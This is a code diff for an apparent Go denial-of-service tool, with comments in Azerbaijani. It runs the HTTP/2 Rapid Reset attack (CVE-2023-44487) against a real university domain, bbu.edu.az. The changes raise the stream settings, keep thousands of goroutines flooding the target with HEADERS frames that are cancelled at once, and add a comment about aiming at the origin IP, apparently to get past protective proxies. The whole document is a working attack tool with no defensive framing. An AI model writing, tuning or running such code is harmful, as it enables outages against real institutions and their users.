@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
-	"os"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -15,44 +14,37 @@ import (
 )
 
 var (
-	target  = "bbu.edu.az" // Host və Port
-	workers = 3000                 // Railway üçün maksimum goroutine
+	target  = "bbu.edu.az" // Origin IP tapmısınızsa onu yazın
+	sni     = "bbu.edu.az"
+	workers = 2500
 	count   uint64
 	errors  uint64
 )
 
 func main() {
-	fmt.Printf("[!!!] KATAKLİZM AKTİVDİR: %s\n", target)
-	fmt.Println("[!] Protokol səviyyəli TLS Handshake + HTTP2 Reset başladıldı.")
-
-	var wg sync.WaitGroup
+	fmt.Printf("[!!!] KATAKLİZM-X-FORCE AKTİVDİR: %s\n", sni)
+	
 	for i := 0; i < workers; i++ {
-		wg.Add(1)
 		go func() {
-			defer wg.Done()
 			for {
 				attack()
+				time.Sleep(10 * time.Millisecond) // CPU-nu tam kilidləməmək üçün minimal fasilə
 			}
 		}()
 	}
 
-	// Hesabat
-	go func() {
-		for {
-			time.Sleep(3 * time.Second)
-			fmt.Printf("[STATS] Uğurlu Reset: %d | Bloklanan/Xəta: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
-		}
-	}()
-
-	wg.Wait()
+	// Səssiz Hesabat
+	for {
+		time.Sleep(5 * time.Second)
+		fmt.Printf("[HAKAI] RESET: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
+	}
 }
 
 func attack() {
-	// TLS 1.3 və HTTP/2 ALPN imitasiyası
 	cfg := &tls.Config{
 		InsecureSkipVerify: true,
 		NextProtos:         []string{"h2"},
-		ServerName:         "one-vv6543.com",
+		ServerName:         sni,
 	}
 
 	dialer := net.Dialer{Timeout: 5 * time.Second}
@@ -70,31 +62,31 @@ func attack() {
 	}
 	defer tlsConn.Close()
 
-	// HTTP/2 Preface göndərilməsi (Cihazın brauzer olduğunu sübut edir)
+	// HTTP/2 Preface
 	tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
 
 	framer := http2.NewFramer(tlsConn, tlsConn)
-	framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000})
+	framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 2000})
 
-	// Sürətli Reset Döngüsü - Serverin beynini yandıran hissə
+	// Rapid Reset (CVE-2023-44487)
 	for i := 0; i < 500; i++ {
 		streamID := uint32(2*i + 1)
 		
-		// HEADERS göndər və dərhal RST_STREAM ilə ləğv et
-		// Bu "Rapid Reset" (CVE-2023-44487) metodudur
-		var headerBuf []byte
-		enc := hpack.NewEncoder(nil) // Təxmini emal üçün
-		_ = enc
-
 		framer.WriteHeaders(http2.HeadersFrameParam{
 			StreamID:   streamID,
 			EndHeaders: true,
 			EndStream:  false,
-			BlockFragment: []byte("\x82\x86\x84\x41\x8c\xf1\xe3\xc2\xe5\xf2\x3a\x6b\xa0\xab\x90\xf4\xff"), // Realist Header imitasiyası
+			BlockFragment: []byte{
+				0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1, 0xe3, 0xc2, 0xe5, 0xf2, 0x3a, 0x6b, 0xa0, 0xab, 0x90, 0xf4, 0xff,
+			},
 		})
 
-		// DƏRHAL RESET - Server hər axın üçün resurs ayırır amma heç nə ala bilmir
 		framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
 		atomic.AddUint64(&count, 1)
+		
+		// Sürətli bombardman - saniyədə minlərlə stream ləğvi
+		if i%10 == 0 {
+			time.Sleep(time.Microsecond)
+		}
 	}
 }
